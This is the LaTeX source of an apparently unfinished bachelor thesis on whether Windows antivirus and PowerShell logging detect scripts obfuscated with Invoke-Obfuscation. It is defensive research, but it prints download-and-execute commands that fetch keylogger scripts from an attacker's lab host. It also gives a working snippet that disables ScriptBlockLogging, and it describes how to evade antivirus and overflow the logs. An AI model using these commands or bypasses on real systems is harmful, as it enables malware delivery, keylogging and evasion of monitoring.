@@ -1,0 +1,821 @@
+
+\documentclass{article}% use option title page to get the title on a page of its own.
+\usepackage{blindtext}
+\usepackage{hyperref}
+\usepackage{graphicx}
+\graphicspath{ {./Images/} }
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=cyan,
+}
+\title{Detecting Obfuscated Scripts and Power-Shell Commands in Windows.}
+\date{2020\\ September}
+\author{Zamir Amiri\\ Computer Science, University Groningen 
+\\Bachelor thesis
+\and F.F.M. Mohsen (supervisor)
+\and Dimka Karastoyanova (supervisor)
+}
+\begin{document}
+\maketitle
+\section*{Abstract}
+{Text HERE}
+\newpage
+\tableofcontents
+\newpage
+\section{Introduction}
+As society is becoming more and more automated with the help of computers, information security becomes more important. Currently more then thirty percent of the worlds economy is powered by computers. This is partly caused by the increase of web-services. Cybercriminals therefore have a large array of targets to attack, steal data from or extort. As a counter action another form of hacker was created, the [\hyperlink{4}{4}]white hat hacker. This group uses the same tools as the black-hat hackers ,cyber criminals, to find security holes and fix them. Since the rise of this group, we have been able to learn more about how cyber criminals go to work. The strategy of a hacker can in general be described by [\hyperlink{4}{4}]five phases:
+\begin{enumerate}
+  \item Reconnaissance
+  \item Scanning and Enumeration
+  \item Gaining Access
+  \item Maintaining Access
+  \item Covering Tracks
+\end{enumerate}
+\subsection{Reconnaissance}
+In this phase the attacker will attempt to look for information on the target while keeping himself as hidden as possible. There are two types of reconnaissance: passive and active. In passive reconnaissance the attacker will try to keep himself away from the target as much as possible. The attacker will try to validate the attacker e.g. position, nslookup and dnsrecon. The attacker will try to use third party apps to find more information on the target. This can vary greatly between apps such as Facebook and google. In the active phase the hacker will access the target directly and use tools such as nmap. The main idea of this phase is to gain as much information as possible to then decide whether the target might be worth attacking.
+\subsection{Scanning and Enumeration}
+Once the attacker has chosen the target, the second phase will start. In this phase the attacker will try to find more information, which could help the attacker to gain access. This phase can best be described by:
+\begin{itemize}
+	\item port scanning
+	\item vulnerability scanning
+	\item network mapping
+\end{itemize}
+Port scanning would let the attacker know in which way he could connect to the system, or which services are running on the target.
+Vulnerability scanning is the search for information about software, like software version and known vulnerabilities for that version, that could help the attacker to use exploitation tools in order to gain access.
+Network mapping would allow the attacker to map all the systems that are connected to each other, this would help the attacker to gain access to the main target by exploiting a vulnerability on another system that is connected to it.
+\subsection{Gaining Access}
+In this phase the information of phase one and two are used to break into the target. In general an attacker goes through multiple cycles the three phases.
+\subsection{Maintaining Access}
+Security vulnerabilities are patched constantly these days, which is why the attacker cannot assume that he will be able to gain access in a later time the same way he did the last time. This is why the attacker will create a program that will allow the attacker to connect to the system at any given time. This is in general done through files like Trojans. The attacker will also try to gain full control or the system, by using scripts that will exploit the system further. This phase is also called \textbf{post-exploitation}. The main goal at phase three is to gain root (admin) privilege on the targets system and build a way to comeback to the system if required.
+\subsection{Clearing Track}
+In this phase the attacker will try to delete any information that could indicate to the system admin that the system has been compromised. In general an attacker would remove all files used during the attack or changing log files which have documented the attack.
+
+\subsection{Goal}
+During the [\hyperlink{5}{5}]fourth phase of the attack, the attacker will try use many scripts in order to gain root access. One tool that has been used lately on windows system to execute malware is Powershell. PowerShell is a very powerful shell, that has been introduced in the recent years by Microsoft. The tool is very flexible and therefore has become one of the go-to programs for attackers. Antivirus software have been scanning for these types of scripts by looking for patters inside the script and unusual commands that are invoked by powershell. In order to bypass this security feature, attackers have started to use a technique called [\hyperlink{6}{6}]\textbf{obfuscation}. Obfuscation is a trick to make code less readable, for both humans and machines, while retaining it's original function. Obfuscation was first used by programmers to make reading code harder in order to create a new line of defence against hackers. [\hyperlink{3}{3}] Attackers have since seen the usefulness of obfuscation and have started to use it to bypass scanning tools. To help the fight against the evil hackers, Daniel Bohannon has created a tool called [\hyperlink{1}{1}]Invoke-Obfuscation which can be used by the blue team, in order to simulated what attackers do and find ways to fix the problem. This thesis will focus on the Invoke-Obfuscation tool and its effectiveness for bypassing multiple Windows security systems and an attempt will be made to use MTD as another line of defence against scripting. Further more an analysis will be done on the obfuscation of different scripts using a software reversal engineering tool called Ghidra. The research questions for this thesis are:
+\begin{enumerate}
+	\item[\textbf{main}]How well does Windows detect and defend itself against obfuscated scripts and powershell commands?
+	\item[\textbf{subquestions}]
+	\item Which obfuscation methods are considered are labeled malicious by antivirus software, regardlesss of the content of the script
+	\item Is it possible to bypass antivirus software, in order to download mallware, by using the download command in powershell?
+	\item Does the powershell logging tool detect obfuscated commands? If so then, how hard is it to bypass it.
+	\item Does the detection-rate of malware depend on the antivirus software used?
+	\item Does the detection-rate of malware depend on which type of obfuscation is used?
+	\item What differences in the output of gidhra can we find between un-obfuscated code obfuscated code as input?
+	\item To what degree can this help anti-malware programs to detect malicious code?
+	\item What parameters can we configure in order to tamper with the success of the attack?
+	\item Does the potency and resilience of the obfuscation influence the detection rate of
+malware?
+\end{enumerate}
+This thesis will answer the sub questions in the upcoming section first and will answer the main question in the final conclusion of the document.
+\newline
+\newline
+\textbf{\textit{Note:}} It is important to note that since the thesis is mostly focused on scripts that might be used during post-exploitation's, that certain assumptions can be made before testing a certain script. An example of one assumption would be: "The attacker already has admin access to the system". Since the main goal is to measure windows' defence against obfuscated scripts, privileges like admin access or maintaining access can be assumed. For every script used in this thesis a small list of assumptions might be given before hand.
+
+\section{Test-Environment}
+All tests have been done on virtual machines, and one laptop. The malware downloaded on the victim machines were hosted by the attackers machine using:
+\begin{verbatim}
+python -m SimpleHTTPServer
+\end{verbatim}
+\subsection{Attackers machine}
+The scripts were also obfuscated using the attackers machine. The specifications of the attacker machine are:\\
+\\
+\begin{verbatim}
+System:    Kernel: 5.5.0-1parrot1-amd64 x86_64 bits: 64 compiler:
+			gcc v: 9.3.0 Desktop: KDE Plasma 5.17.5 
+           Distro: Parrot GNU/Linux 4.10 base: Debian parrot
+Machine:   Type: Desktop Mobo: Micro-Star model: MS-B090 v: 1.1 
+			serial: <filter> UEFI: American Megatrends v: 8.40 
+           date: 01/20/2016 
+CPU:       Info: Quad Core model: Intel Core i5-6400 bits: 64 type:
+			MCP arch: Skylake-S rev: 3 L2 cache: 6144 KiB 
+           flags: avx avx2 lm nx pae sse sse2 sse3 sse4_1 sse4_2 ssse3
+            vmx bogomips: 21599 
+           Speed: 800 MHz min/max: 800/3300 MHz Core speeds (MHz): 1: 
+           832 2: 802 3: 1324 4: 806 
+Graphics:  Device-1: Advanced Micro Devices [AMD/ATI] Ellesmere 
+			[Radeon RX 470/480/570/570X/580/580X/590] 
+           vendor: Micro-Star MSI driver: amdgpu v: kernel bus ID: 01:00.0
+\end{verbatim}
+The VMs used for this research were all run on this machine using Oracle VM VirtualBox Manager, all having the following specification:
+\begin{verbatim}
+	Base Memory: 2048MB
+	Processors: 1CPU
+	Storage: 50GB
+	Architecture: 64 bit
+\end{verbatim}
+\subsection{OS version}
+The operating systems used were:
+\begin{enumerate}
+	\item Windows 10 (using windows defender)
+	\item Windows 8.1 (using windows defender, AVG and McAfee)
+	\item Windows 7 (using windows defender and AVG)
+	\item Windows 2016 (using windows defender)
+	\item Windows 2019 (using windows defender)
+\end{enumerate}
+\subsection{Victim machines}
+A total of seven victim machines were used for this research. Further specification of the machines can be found below.
+\subsubsection{Victim 1}
+\begin{verbatim}
+Edition: Windows 10 Home
+Version: 2004
+OS build: 19041.508
+Experience: Windows Feature Experience Pack 120.2212.31.0
+===PowerShell===
+PSversion: 5.1.19041.1
+PSEdition: Desktop
+BuildVersion: 10.0.19041.1
+CLRVersion:	4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemoteProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+===AV===
+Windows Defender
+Antimalware Client Version: 4.18.2009.7
+Engine Version: 1.1.17500.4
+Antivirus Version: 1.325.1580.0
+Antispyware Version: 1.325.1580.0
+\end{verbatim}
+\subsubsection{Victim 2}
+\begin{verbatim}
+Edition: Windows 10 Home
+Version: 2004
+OS build: 19041.508
+Experience: Windows Feature Experience Pack 120.2212.31.0
+===PowerShell===
+PSversion: 5.1.19041.1
+PSEdition: Desktop
+BuildVersion: 10.0.19041.1
+CLRVersion:	4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemoteProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+===AV===
+AVG
+Version: 20.8.3144
+Build: 20.8.5653.561
+Virus definitions version: 201012-0
+\end{verbatim}
+\subsubsection{Victim 3}
+\begin{verbatim}
+Edition: Windows 10 Home
+Version: 2004
+OS build: 19041.508
+Experience: Windows Feature Experience Pack 120.2212.31.0
+===PowerShell===
+PSversion: 5.1.19041.1
+PSEdition: Desktop
+BuildVersion: 10.0.19041.1
+CLRVersion:	4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemoteProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+===AV===
+McAfee
+Version: 16.0
+\end{verbatim}
+\subsubsection{Victim 4}
+\begin{verbatim}
+Edition: Windows 8.1
+Version: 6.3
+OS build: 9600
+===PowerShell===
+PSversion: 4.0
+BuildVersion: 10.0.19041.1
+CLRVersion:	4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemoteProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+===AV===
+Windows Defender
+Antimalware Client Version: 4.18.2009.7
+Engine Version: 1.1.17500.4
+Antivirus Version: 1.325.1580.0
+Antispyware Version: 1.325.1580.0
+\end{verbatim}
+\subsubsection{Victim 5}
+\begin{verbatim}
+Edition: Windows 7 Professional
+Version: 6.1
+OS build: 7601: Service pack 1
+===AV===
+AVG
+Version: 20.8.3144
+Build: 20.8.5653.561
+Virus definitions version: 201012-0
+\end{verbatim}
+\subsubsection{Victim 6}
+\begin{verbatim}
+Edition: Windows Server 2019
+Version: 1809
+OS build: 17763.1457
+\end{verbatim}
+\subsubsection{Victim 7}
+\begin{verbatim}
+Edition: Windows Server 2016
+Version: 10.0.14393
+OS build: 14393
+\end{verbatim}
+\subsection{Invoke-Obfuscation}
+The tool used to obfuscate the scripts used is [\hyperlink{1}{1}] Invoke-Obfuscation created by Daniel Bohannon. The following description holds for \textbf{version 1.8}.
+\subsubsection{Usage}
+A short tutorial on how to use Invoke-Obfuscation can be found by typing \textbf{TUTORIAL} in the terminal. In this tutorial one can learn how to load scripts, obfuscate it and write it to a new file. There are [\hyperlink{2}{2}]multiple obfuscation techniques that can be used. These options are:
+\begin{itemize}
+	\item Token
+	\begin{enumerate}
+		\item \textbf{STRING}        
+		\\Obfuscate String tokens (suggested to run first)
+		\item \textbf{COMMAND}       
+		\\Obfuscate Command tokens
+		\item \textbf{ARGUMENT}      
+		\\Obfuscate Argument tokens
+		\item \textbf{MEMBER}        
+		\\Obfuscate Member tokens
+		\item \textbf{VARIABLE}      
+		\\Obfuscate Variable tokens
+		\item \textbf{TYPE}          
+		\\Obfuscate Type tokens
+		\item \textbf{COMMENT}       
+		\\Remove all Comment tokens
+		\item \textbf{WHITESPACE}    
+		\\Insert random Whitespace (suggested to run last)
+		\item \textbf{ALL}           
+		\\Select All choices from above (random order)
+	\end{enumerate}
+	\item Ast
+	\begin{enumerate}
+		\item \textbf{NamedAttributeArgumentAst}  
+			\\Obfuscate NamedAttributeArgumentAst nodes
+		\item \textbf{ParamBlockAst}              
+			\\Obfuscate ParamBlockAst nodes
+		\item \textbf{ScriptBlockAst}             
+			\\Obfuscate ScriptBlockAst nodes
+		\item \textbf{AttributeAst}               
+			\\Obfuscate AttributeAst nodes
+		\item \textbf{BinaryExpressionAst}        
+			\\Obfuscate BinaryExpressionAst nodes
+		\item \textbf{HashtableAst}               
+			\\Obfuscate HashtableAst nodes
+		\item \textbf{CommandAst}                 
+			\\Obfuscate CommandAst nodes
+		\item \textbf{AssignmentStatementAst}     
+			\\Obfuscate AssignmentStatementAst nodes
+		\item \textbf{TypeExpressionAst}          
+			\\Obfuscate TypeExpressionAst nodes
+		\item \textbf{TypeConstraintAst}          
+			\\Obfuscate TypeConstraintAst nodes
+		\item \textbf{ALL}                        
+			\\Select All choices from above
+
+	\end{enumerate}
+	\item String
+	\begin{enumerate}
+		\item Concatenate entire command
+		\item Reorder entire command after concatenating
+		\item Reverse entire command after concatenating
+	\end{enumerate}
+	\item Encoding
+	\begin{enumerate}
+		\item Encode entire command as ASCII
+		\item Encode entire command as Hex
+		\item Encode entire command as Octal
+		\item Encode entire command as Binary
+		\item Encrypt entire command as SecureString (AES)
+		\item Encode entire command as BXOR
+		\item Encode entire command as Special Characters
+		\item Encode entire command as Whitespace
+	\end{enumerate}
+	\item Compress
+	\begin{enumerate}
+		\item Convert entire command to one-liner and compress
+	\end{enumerate}
+	\item Launcher
+	\begin{enumerate}
+		\item \textbf{PS} 			
+		\\PowerShell
+		\item \textbf{CMD}      	
+		\\Cmd + PowerShell
+		\item \textbf{WMIC}      	
+		\\Wmic + PowerShell
+		\item \textbf{RUNDLL}  		
+		\\Rundll32 + PowerShell
+		\item \textbf{VAR+}     	
+		\\Cmd + set Var \&\& PowerShell iex Var
+		\item \textbf{STDIN+}   	
+		\\Cmd + Echo $|$ PowerShell - (stdin)
+		\item \textbf{CLIP+}     	
+		\\Cmd + Echo $|$ Clip \&\& PowerShell iex clipboard
+		\item \textbf{VAR++}    	
+		\\Cmd + set Var \&\& Cmd \&\& PowerShell iex Var
+		\item \textbf{STDIN++}   	
+		\\Cmd + set Var \&\& Cmd Echo $|$ PowerShell - (stdin)
+		\item \textbf{CLIP++}    	
+		\\Cmd + Echo $|$ Clip \&\& Cmd \&\& PowerShell iex clipboard
+		\item \textbf{RUNDLL++}		
+		\\Cmd + set Var \&\& Rundll32 \&\& PowerShell iex Var
+		\item \textbf{MSHTA++}   	
+		\\Cmd + set Var \&\& Mshta \&\& PowerShell iex Var
+	\end{enumerate}
+\end{itemize}
+This thesis will make use of these terms when refering to an obfuscation technique used on a script.
+
+\section{Sub-questions}
+
+\subsection{Which obfuscation methods are labeled malicious by antivirus software, regardlesss of the content of the script}
+[\hyperlink{2}{2}]It is well known that the microsoft team already knows about the issues of obfuscated code. Therefore it can be assumed that some protection measures against obfuscation of code has already taken place by both [\hyperlink{12}{12}] windows tools such as windows-defender but also third party antivirus software. This became more apparent at the start of this project, when some non malicious code was labeled as malicious by windows defender and other antivirus programs. This created a new sub-questions that had to be answered first before any other question could be answered. Namely which obfuscated techniques are automatically considered to be malware by a system, regardless of the actual function of the code. To find the answer for this question a simple \hyperlink{script1}{script} has been executed with different obfuscation techniques using Invoke-Obfuscation. The results can be found in the table 1. The table has four columns with the necessary information required in order to reproduce the results, that is:
+\begin{enumerate}
+	\item[Obfuscation] The commands used to obfuscate the script using Invoke-Obfuscation.
+	\item[OS] The OS that the code was run on.
+	\item[Program] The antivirus program that is currently on the system.
+	\item[Detected] A boolean value indicating the detection and labeling of the script as malicious.
+\end{enumerate}
+The command used to download and execute the scripts was:
+\begin{verbatim}
+Invoke-Expression (New-Object Net.WebCLient).DownloadString("url\script.ps1");
+\end{verbatim}
+When looking at the result, table 1,2,3,4 and 5. It becomes apparent that the defence programs are not working well. The best detection rate can be found for MCAfee on Windows 10, which labels every obfuscated script as malicious. This is because, [\hyperlink{7}{7}]McAfee, as it's line of defence against fileless scripting, is blocking any powershell command that uses \textit{Invoke-Expression} with the \textit{Downloadstring} function. However this can be easily bypassed by downloading the script first, \textbf{Invoke-WebRequest}, and then executing it. In that case MCAfee does not block the execution of any script. But to execute scripts which were first downloaded, one would first need to change the ExecutionPolicy of the system to 'Bypass' or create a .bat file that executes the .ps1 file with the \textit{ExecutionPolicy} flag set to \textit{Bypass}. On the other hand windows defender had a more stable result, meaning it can find some of the obfuscated scripts regardless of what command was used to download it. Some versions of windows are not compatible with some encoding types, resulting in an error output. This is indicated in the table with the string 'ERROR'. Furthermore Windows servers were incompatible with avg and mcafee and therefore have a shorter table. In case of Windows 7, it was not possible to install McAfee.
+\subsubsection{Conclusion}
+It is not possible to conclude yet whether the antivirus software is effective. That is because there are two scenarios that have to be considered. First the code is scanned by the antivirus software and concluded that 'Write-Host "Hello World!" -f red' is not a malicious command. second the obfuscated code was unreadable by the program. However the information gathered from this test suggests that some types of obfuscation are considered to be viruses by some antivirus software regardlesss of the actual content. This would mean that these forms of obfuscation should in general be avoided when obfuscating a script for a distinct operating system. Hover multiple attempts of obfuscation and execution shows that all types of obfuscation can lead to an AV labeling the script as malicious. This means that trial and error method needs to be used in order to find which form of obfuscation works best for each script. It also makes sense that Windows defender has the most consistent results, since [\hyperlink{2}{2}]Lee Holmes (Lead security architect of Microsoft), has been working together with Daniel Bohannon on this problem.
+\subsection{Is it possible to bypass antivirus software,in order to download malware, by obfuscating the download command in powershell?"}
+This question comes forth when looking at how McAfee is blocking the \textbf{Invoke-Expression} when used together with the \textit{Downloadstring} function. To test this the malware called Get-Keystrokes from [\hypertarget{8}{8}]PowerSploit was used. This scriptfile is immediately seen as a virus by Win Defender, AVG and McAfee. The commands used inorder to download the scripts were:\\
+\begin{verbatim}
+Invoke-WebRequest "http://IPAddress:Port/Get-Keystrokes.ps1" 
+      -o "Get-Keystrokes.ps1"
+wget "http://IPAddress:Port/Get-Keystrokes.ps1" -o "Get-Keystrokes.ps1"
+curl "http://IPAddress:Port/Get-Keystrokes.ps1" -o "Get-Keystrokes.ps1"
+\end{verbatim}
+Many different iterations of the obfuscation tools were used, with the focus on [\hyperlink{1}{1}]Token,AST,String and Encoding. The answer was very clear, all antivirus programs were able to detect the malware before it got downloaded and blocked it one hundred percent of the time. On the other hand, when \textbf{secure-string} encoding is used, the script could be easily downloaded without notifying any AV program.
+\subsubsection{Conclusion}
+It does not seem to be possible to obfuscate the download command inorder to download malware that otherwise would have been blocked. However it is fairly simple to get malware on the system by encoding the malware itself. This could be a problem when it comes to other types of malware.
+\subsection{Does the powershell logging tool detect obfuscated commands? If so then, how hard is it to bypass it.}
+Powershell script logging is used by forensics teams to find what the attackers intentions were. [\hyperlink{8}{8}] But thanks to continuous development of the scriplogging tool, it is now also possible to detect an attack using by using the module logging and scriptblock logging tool (available in powershell v5 or later).
+\subsubsection{Powershell Module Logging}
+[\hyperlink{9}{9}] Module Logging has been available since powershell v3. This logging tool logs command invocations, which can be very useful since some command invocations, such as "IEX SomeString", immediately raise suspicion. This tool logs these commands sometimes even if the command has been obfuscated. There are multiple log analysis tools that make use of the logs created by module logging to alert a server manager. Therefore bypassing the module logging is important.
+\subsubsection{Powershell Script Block Logging}
+[\hyperlink{9}{9}]Script Block Logging logs the whole block of code just before it gets executed. This ensures that the whole attacking script is logged. It also deobfuscates the code if necessary. It also makes certain obfuscation techniquest obsolete such as [\hyperlink{9}{9}] encoding in \textit{XOR},\textit{Base64} and \textit{ROT13}. Script block logging is only available on windows 10 and windows server 2016+. [\hyperlink{9}{9}] The script block logging tool also compares the code blocks with hashes of known malicious scripts as a quick check. If they match it can be found with the warning tag in the Event viewer.
+\subsubsection{Importance}
+SIEM tools (and [\hyperlink{10}{10}] AMSI) have become another line of defence. Therefore an attacker also needs to bypass the PowerShell logging tool during an attack. This makes the subquestion: \textbf{"Does the powershell logging tool detect obfuscated commands? If so then, how hard is it to bypass it"}. This question has been partly answered by [\hyperlink{11}{11}] Andy Green, who tested the module logging capabilities.Some obfuscated code can be deobfuscated by the logging tool (both module and code block logging). However when multiple iterations of obfuscation is used, the logging tool instead logs the obfuscated command with the obfuscation.
+\newline\newline
+\hypertarget{fig1}{
+	\textit{Figure 1: ScriptBlockLogging log for large obfuscated Get-Keystokes.ps1 from PowerSploit}\\
+	\includegraphics[scale=0.44]{1.png}
+}
+
+However the fact that the obfuscated code can be logged completely can be a problem if read by the SIEM program. For example in figure $1$ it can be seen that the event viewer has labeled the scriptblock with the warning level. Therefore it might be important to find a way to make the logging tool completely irrelevant.
+
+It might be useful to note that when a command is to large to be written in one log event, it is split in multiple log events. This can also be seen in figure $1$ in the very first line saying:\textbf{"Creating Scriptblock text (2 of 52)"}. Further more the event viewer has a maximum storage value for each log, which is $15360$ kb. With this information a new question can be asked: \textbf{What happens if the scriptblock creates a larger log file then the maximum storage value?} The log file created by running the obfuscated Get-Keystrokes.ps1 file is $2.06$ mb. Therefore to answer the question above, the maximum storage capacity is shrinked to 1028kb. Executing the script again resulted in:\newline\newline
+
+\textit{Figure 2: ScriptBlockLogging log for large obfuscated script with 1028kb storage space}\\
+\includegraphics[scale=0.44]{2}
+The log file has been written over multiple times which removed all the warning that it showed initially. However the event viewer also allows the server admin to store the log files when maximum capacity has been reached instead of deleting the oldest entry. In general it can be assumed that this option won't be used as it gives an attacker an easy way to fill the computers storage space with trivial commands. In fact after searching for log files with event ID $4104$ which is the event id used for scriptblock logging, it became apparent that none of the events were stored. This probably happened because the event viewer was trying to store all segmented parts of the scriptblock in one file.
+
+\subsubsection{Conclusion}
+The powershell logging tool is indeed capable to deobfuscate obfuscated scripts. The module logging, as stated in \hyperlink{11}{11}, can find invocation commands when called through the obfuscated script, which would mean that a SIEM tools could use the log file to detect a security breach. However bypassing it is fairly simple. A hacker could test the obfuscated script on his own VM first before running it on the victim's system in order to find the right obfuscation for the script. The powershell scriptblock logging tool on the other hand, is much more powerful. It can not only deobfuscate scriptblocks, it also can scan the unobfuscated scripts and compare them to known malicious scripts. When the logging tool finds a match it labels the scriptblock as potentially malicious which can be seen in \hyperlink{fig1}{figure 1}.
+There are multiple ways to bypass the logging tools. The most commonly used bypass would be [\hyperlink{10}{10}]:
+\begin{verbatim}
+$settings = [Ref].Assembly.GetType(“System.Management.Automation.Utils")
+.GetField(“cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
+$settings
+[“HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+ = @{}
+$settings
+[“HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+.Add(“EnableScriptBlockLogging", “0")
+\end{verbatim}
+And a similar command would deactivate powershell module logging. This command uses the group policy that has been cached and therefore does not require any additional privilege. Meaning it can be executed by any user. However it is important to note that the command itself has been logged. Which can trigger an alarm on its own. Therefore obfuscating this command would be necessary to bypass the powershell logging and the SIEM tools. To check the effectiveness of obfuscation, the command:
+\begin{verbatim}
+[Ref].Assembly.GetType("System.Management.Automation.Utils")
+.GetField("cachedGroupPolicySettings","NonPublic,Static")
+.GetValue($null)
+["HKEY_LOCAL_MACHINE\Software\Policies
+\Microsoft\Windows\PowerShell\ScriptBlockLogging"]
+= @{}
+\end{verbatim}
+was obfuscated 60 times, each having a distinct iteration of different obfuscation techniques. The result was that PowerShell module logging was able to deobfuscate to command currently each time. This is probably the case since the command is a well known command and so many hashes of this command have probably been stored to which the obfuscated files were compared to. The log file would reach a size of $6$ mb on average, which is fifty percent of the standard size of the log file. In these types of situations, increasing the size of the events logged by executing the script would be very useful as a bypass technique.
+\subsection{What is the real performance of the PowerShell logging tool when large attacking scripts are executed}
+Up until now, only small scripts or commands have been executed on powershell. This gives the logging tool enough time and space to log the events of one task efficiently. However real attack scripts can consist out of thousands lines of code i.e. (Invoke-Mimikatz.ps1 $2.745$ lines. Logging the deobfuscated commands of large obfuscated scripts should in theory be harder. Therefore it is important to analise the real effect of the powershell logging tool. Therefore to answer the question \textbf{"What is the real performance of the PowerShell logging tool when large attacking scripts are executed"} it is required to execute several actual malicious scripts and analise the out put of the powershell logging tool in the event viewer.
+\newline
+The flexibility and power of powershell allows attackers to use powershell in multiple ways and for multiple types of attacks. This thesis is will focus itself on the most common types of attacks.
+\newline
+\subsubsection{Types of attacks}
+According to [\hyperlink{13}{13}] the CESG, there are two types of attacks: Un-targeted attacks and Targeted attacks. Un-targeted attacks are attacks that indiscriminantly attack as many devices as possible. Most pc users will have fallen victim to these types of attacks. While in targeted attacks, the attacker is focused on attacking a specific victim. Most attacked organisations will have fallen victim to these types of attacks. Each type of attack has its own attacking techniques:\\
+\textbf{Untargeted attacks}
+\begin{enumerate}
+	\item Phishing
+	\item Water holing
+	\item Ransomware
+	\item Scanning
+\end{enumerate}
+\textbf{Targeted attacks}
+\begin{enumerate}
+	\item Spear-phishing
+	\item Deploying a botnet
+	\item Subverting the suply chain
+	\item Brute force attacks
+	\item Malware execution
+	\item Man in the middle attack
+	\item Social engeneering
+\end{enumerate}
+In the following sub-sections, the usage of several attacking scripts will be documented including the performance of powershell logging. Further more the attacking model that corresponds with the usage of the attacking script will be discussed. This will allow for a better assessment of the potential threat of powershell scripts.\\
+\newline
+\textbf{\textit{Note:}}\\
+Since this section is mostly focused on powershell logging, the AV might be disabled in order to execute some of the attack scripts. If this is the case, then it will be stated in the subsection of the corresponding attacking script. The original version of the script is for the sake of reproducability also added as attachment under \hyperlink{scrip2}{Keylogger.ps1}
+
+\subsubsection{Keylogger}
+[\hyperlink{16}{16}]This keylogger script is proof of case script, meaning that it is written such a way such that it cannot be used as a real keylogger as is. Although the number of changes required to be made in order to use this keylogger as actual mallware is minimal.
+\paragraph{Attack model}\hfill
+\newline
+To make use of this script, the attacker can make use of two different attack models. In the first model, the atacker could gain acces to a local machince and execute the script. This script does not require admin privilages in order to execute, therefore the victim machine is not required to be a system that can give the attacker admin privilages.
+\newline
+\\
+The second attack model consists is the more real model used with these types of scripts. That is: the attacker will send an email to random email addresses claiming that the file whitin the mail has some encrypted secret stored inside, which can only be decrypted if the file is executed. This attack model in general raises suspicion which would mean that the attacker will be required to use some form of social engeneering to lower the users suspicion. Also it might be usefull to note that although microsft, as a security measure, has designed the admin privilege request in a way such that the user is always aware of giving a file admin privileges, that this security measure does not hold much value in the real world as most users will klick on the yes button of the prompt without giving it a second thought. [\hyperlink{17}{17}]This has been proven time and again by the number of user agreement that have been agreed on by software users which have not been read.
+\paragraph{Description}\hfill\newline
+This script runs a process that uses the GetAsyncKeyState api and stores the value of this key in a file which has its path stored in \$Path. The script terminates if \textbf{Ctrl$+$C} is pressed and opens the file with the stored keys using notepad. This script consists out of 42 lines of code and therefore is a good script to start with in order to answer the sub question of this section.
+
+\paragraph{Usage}\hfill\newline
+This script is run on Windows $8.1$ and Windows Server $2019$ since Windows Server $2016$ and Windows $10$ have the same logging capabilities as Windows Server $2019$. Since the focus is on how powershell logging will interact with the script, the attack models are ignored. Instead the script is executed and downloaded using the unobfuscated powershell command:
+\begin{verbatim}
+Invoke-Expression (New-Object Net.WebClient)
+.DownloadString("http://192.168.2.36:8000/Keylogger.ps1");
+\end{verbatim}
+The script is manually obfuscated with Invoke-Obfuscation using the following obfuscation commands in the corresponding order:
+\begin{enumerate}
+	\item AST ALL
+	\item Encoding 2 (HEX)
+	\item String 1
+	\item Encoding 7 (Special characters)
+	\item Encoding 4 (Binary)
+\end{enumerate}
+The resulting script has a length of $881651$ characters.
+\paragraph{Windows 10/Server 2016/ Server 2019}
+In order to execute the script AV was disabled. After executing the script (for about 15 secconds) the following has been noted:
+\begin{enumerate}
+	\item Windows Powershell logfile (includes module logging) generated $9296$ events. The filesize is $15$ mb.
+	\item Powershell Operational logfile (includes scriptblock logging) generated $8291$ events. The file size is $16.50$ mb.
+	\item No warning-level events were logged.
+	\item Highest level event is verbose.
+	\item De-obfuscated code was still entangled with obfuscated code.
+\end{enumerate}
+The following has been noted after executing the unobfuscated \hyperlink{script2}{script}:
+\begin{enumerate}
+	\item Windows Powershell logfile (includes module logging) generated $550$ events. The filesize is $1$ mb.
+	\item Powershell Operational logfile (includes scriptblock logging) generated $556$ events. The file size is $1,07$ mb.
+	\item One warning-level event were logged.
+	\item Highest level event is warning.
+	\item De-obfuscated code was clearly visible entangled with obfuscated code.
+\end{enumerate}
+
+\paragraph{Windows 8.1 (Default Powershell logging)}\hfill\newline
+Most windows $8$ users will have the default installation of windows 8. This version of windows $8$ does not include module logging and script block logging. Therefore in this section, the effectiveness of default powershell logging is documented.
+In order to execute the script AV was disabled.
+
+\paragraph{Windows 8.1 (Advanced Powershell logging)}\hfill\newline
+In this section the performance of powershell logging ,including module and script block logging, is analised.In order to execute the script AV was disabled.
+The results of this have been documented in table $6$ of the atachement. The results of windows $10/2016/2019$ have also been added to this table.
+
+\paragraph{Intermediary Results}\hfill\newline
+The results found for Obfuscated scripts are supspicious. Each log file was cleared before running the scripts. Therefore since all logg files had reached the same size, it could only mean that the maximum size of the log files have been reached. This would mean that some log entries have been missed. So to test this, the log settings have been changed such that if the log file has reached the maximum length, it will be stored and a new log file will be used for new entries. After doing this, the scripts, both obfuscated and un-obfuscated, was run again. The results can be found in table $7$ in the attachements. Table $7$ clearly shows that a large part of the log file was deleted before. Therefore from this point on, the attack scripts will only be run while having archiving enabled.
+
+\subsubsection{Ransomware}
+The next malware script is ransomware. Ransomware is a type of malware that encrypts user files and required the victim to pay ransom in order to decrypt and retrieve their stolen files. This particular ransomware script encrypts everyting in the given path directory using 7zip. Before encrypting the files found, the script generates a random key that is used to encrypt the files found. This key is then sent to the attacker through a mail system. This code can be considered as malicious, therefore it will not be shared in this thesis. The script is used for untargeted attacks, which is enabled by the mailing feature, and uses the same attack model as Keylogger.ps1. Futhermore the script requires admin privileges to function correctly. The script terminates on its own. This means that it is not necessary to measure the execution time since longer execution time does not correspond to more operations.
+
+\subsubsection{Reverse Shell}
+A reverse shell is a script that allows a remote user to have direct acces to a victims computer. Revershell scripts in powershell will allow the attacker to gain remote acces to a powershell terminal. And therefore have complete acces to all the tools and functions that make powershell so powerfull. Attackers make use of reverse shell terminals mainly to scan the victims machine (Reconesance), download virusses, exploit security vulnerabilities. The ways in which a reverse shell can be created can vary greatly. An example of deploying a reverse shell is scetched in the next section.
+\paragraph{Attack model}\hfill
+\newline
+The attacker visits a website which has a php backend. He then uploads a php file in a unsecure field which was meant to be used to upload images. When the attacker now visits the page in which the image was suposed to be displayed, the php script uploaded by the attacker is executed. The attackers script makes use of:
